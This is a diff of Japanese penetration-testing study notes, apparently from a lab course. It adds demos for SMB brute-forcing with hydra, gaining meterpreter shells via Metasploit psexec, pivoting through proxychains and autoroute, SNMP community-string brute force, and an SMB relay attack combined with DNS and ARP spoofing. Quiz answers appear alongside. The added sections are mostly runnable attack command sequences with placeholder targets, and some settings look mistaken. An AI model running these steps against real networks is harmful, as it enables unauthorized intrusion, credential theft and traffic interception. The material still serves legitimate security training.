@@ -80,7 +80,7 @@ nmap -p445 --script smb-enum-users.nse ターゲットドメイン
 9) 8)で見つけたユーザ名をファイルを作成して保存する
 nano users.txt
 10) hydraツールを実行して、SMBプロトコルをブルートフォースし、指定したユーザと有効なパスコードを見つける
-hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt ターゲットドメイン smb
+hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ターゲットドメイン smb
 ＊-L：ユーザリスト
 ＊-P：パスワードリスト
 11) Metasploitフレームワークを使用して、psexecエクスプロイトモジュールを実行し、管理者ユーザーの有効なパスワードを使用してmeterpreterシェルを取得
@@ -94,7 +94,41 @@ exploit
 12) 以下のコマンドで、現在のユーザ、システム情報、アーキテクチャーなどのターゲットマシンの情報を検出する
 getuid
 sysinfo
-13) 
+13) 侵入したホストから2番目のターゲットマシンにpingを実行
+shell
+ping ターゲットIPアドレス
+14) meterpreterセッションを使用してルートを追加して2番目のマシンのサービスを識別する
+Ctrl+C
+run autoroute -s ターゲットIP
+15) proxychainsツールを使用して、SOCKプロキシサーバーを起動し、攻撃者のマシン上のピボットシステムにアクセスする。
+socks4a
+cat /etc/proxychains4.conf
+16) 15)で見つけたポートをMetasploit socks proxy補助サーバーモジュールを実行する
+background
+search socks_proxy
+use auxiliary/server/socks_proxy
+show options
+17) ポートとバージョンを変更して実行する
+set SRVPORT port_number
+set VERSION バージョン
+exploit
+job
+18) 以下のコマンドを使用して、proxychainを使用して、ピボットマシンのSMBポートを特定する
+proxychains nmap ドメイン名 -sT -Pn -sV -p ポート番号
+＊ドメイン名：ピボットマシン
+＊-sT：TCP接続スキャン
+＊-Pn：ホスト検出をスキップし、ポートスキャンを強制
+19) net viewコマンドでターゲットマシンに共有されているすべてのリソースを見つける
+sessions -i 1
+shell
+net view ターゲットIP
+20) アクセス拒否を受け取ったら、プロセスをeplorer.exeに移行
+Ctrl+C
+migrate -N explorer.exe
+shell 
+net view ターゲットIP
+21) 上で開いたドキュメントをnet useコマンド確認
+22) マップされたドライブの中身をdirで確認
 
 
 SNMP列挙
@@ -127,6 +161,40 @@ SNMP列挙
 quiz
 ・ブルートフォースでSNMPコミュニティ文字列を検出できるために使用できるツールは、SNMPスクリプトを使用したNmap
 
+demo snmp攻撃
+1) ターミナル起動
+2) 以下のコマンドを使用して、ターゲットマシンの生存確認
+ping -c 5 IPアドレス
+3) 以下のコマンドを使用して、マシンの開いているポートを確認
+nmap IPアドレス
+4) 以下のコマンドでSNMPのUDPポートが開いているかを確認する
+nmap -sU -p 161 IPアドレス
+5) ターゲットマシンにアクセスするためにコミュニティ文字列を見つけるために、ブルートフォース攻撃を行う。
+nmap -sU -p 161 --script=snmp-brute IPアドレス
+6) snmpwalkツールを実行して、SNMP経由ですべての情報を検索する。
+snmpwalk -v バージョン -c コミュニティ文字列 ターゲットIP
+7) 以下のコマンドを使用して、snmpwalkで得られなかったSNMP経由での情報を列挙する
+nmap -sU -p 161 --script snmp-* IPアドレス > snmp_output
+ls
+8) snmp_outputに載っているusersに対してusers.txtを作成
+9) hydraでブルートフォースを実行
+hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt IPアドレス smb
+＊smb：hydraがブルートフォースを行うために使用するプロトコル
+10) metasploit exploitモジュールを実行し、psexecにより、meterpreterを取得する。
+msfconsole -q
+use exploit/windows/smb/psexec
+show options
+11) 設定情報の入力
+set RHOSTS IPアドレス
+set SMBUSER brute-forceで判明したもの
+set SMBPASS brute-forceで判明したもの
+exploit
+12) 最後にフラグを以下で見つける
+shell
+cd C:/
+dir type:ファイル名
+
+
 
 SMBリレー攻撃
 ・SMBリレー攻撃とは、攻撃者がSMBトラフィックを傍受し、改ざんして正規のサーバーに中継することで、不正にリソースへアクセスしたり悪意のある行動を実行したりするタイプのネットワーク攻撃
@@ -149,3 +217,30 @@ SMBリレー攻撃
 quiz
 ・SMBリレー攻撃でDNSスプーフィングが使用される理由は、すべてのSMBリクエストを攻撃者のマシンにリダイレクトする
 ・SMBリレー攻撃を設定するためにmetasploitでよく使用されるツールは、smbrelay
+
+
+demo
+1) ターミナルを起動
+2) msfconsole
+3) 基本情報の設定
+use exploit/windows/smb/smb_relay
+set SRVHOST ターゲットIP
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST ターゲットIP
+set SMBHOST ターゲットIP
+4) 攻撃
+exploit
+5) 設定
+echo "ターゲットIPアドレス *.sportsfoo.com" > dns
+*sportsfoo.com：攻撃者のマシン
+6) DNSスプーフィング
+dnsspoof -i eth1 -f dns
+7) アクティブ化する
+echo 1 > /proc/sys/net/ipv4/ip_forward
+8) 2つの別々の端末で、ARPスプーフィング攻撃を行う
+arpspoof -i eth1 -t ターゲットIP1 ターゲットIP2
+arpspoof -i eth1 -t ターゲットIP2 ターゲットIP1
+9) meterpresessionと対話する。
+sessions
+sessions -i 1
+getuid
